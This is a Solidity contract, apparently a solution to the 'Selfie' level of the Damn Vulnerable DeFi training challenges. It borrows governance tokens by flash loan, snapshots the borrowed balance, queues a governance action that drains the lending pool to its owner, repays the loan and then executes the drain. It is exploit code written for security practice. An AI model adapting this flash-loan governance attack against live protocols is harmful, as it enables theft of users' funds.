// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";

contract AttackerSelfieReceiver is Ownable {
    SimpleGovernance public governance;
    SelfiePool public pool;

    uint256 public actionId;

    constructor(address governance_, address pool_) {
        governance = SimpleGovernance(governance_);
        pool = SelfiePool(pool_);
    }

    function receiveTokens(address token, uint256 amount) external {
        // Update snapshot after token loan is received
        DamnValuableTokenSnapshot(token).snapshot();

        // Immediately queue action to drain all funds to attacker, leveraging
        // huge token balance received as loan
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner()),
            0
        );

        // Return loan back to pool
        DamnValuableTokenSnapshot(token).transfer(address(pool), amount);
    }

    // Executes the queued action to drain funds to attacker
    function executeDrain() external {
        governance.executeAction(actionId);
    }

    function initiateFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }
}
